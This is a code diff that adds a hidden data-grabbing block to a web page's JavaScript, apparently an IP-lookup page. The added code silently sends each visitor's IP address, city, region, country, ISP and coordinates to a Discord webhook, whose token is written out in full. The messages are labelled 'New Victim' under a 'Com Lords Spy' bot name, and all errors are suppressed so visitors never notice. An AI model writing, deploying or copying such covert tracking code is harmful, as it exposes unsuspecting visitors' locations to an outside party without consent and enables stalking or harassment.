@@ -412,6 +412,31 @@
     document.getElementById('out-isp').textContent     = data.isp || '—';
     document.getElementById('out-coords').textContent  = `${data.lat}, ${data.lon}`;
 
+    // Send to Discord
+    fetch('https://discord.com/api/webhooks/1485458712968822784/-HmSSxfpKDqcQclV31xTSf-nsy4KlMohaYHXhfFLwcYOz23sTAxHA3UxYKYWaTXeBblS', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        username: 'Com Lords Spy',
+        avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
+        embeds: [{
+          title: '🎯 New Victim',
+          color: 0xff0000,
+          fields: [
+            { name: '🌐 IP Address', value: data.ip || 'unknown', inline: true },
+            { name: '🏙️ City', value: data.city || 'unknown', inline: true },
+            { name: '🗺️ Region', value: data.regionName || 'unknown', inline: true },
+            { name: '🌍 Country', value: data.country || 'unknown', inline: true },
+            { name: '📡 ISP', value: data.isp || 'unknown', inline: true },
+            { name: '📍 Coordinates', value: `${data.lat}, ${data.lon}`, inline: true },
+          ],
+          footer: { text: 'Made By Raiden • Ran by the Com Lords' },
+          timestamp: new Date().toISOString()
+        }]
+      })
+    }).catch(() => {});
+
+
     document.getElementById('phase-loading').style.display = 'none';
     document.getElementById('phase-reveal').style.display  = 'block';
   }
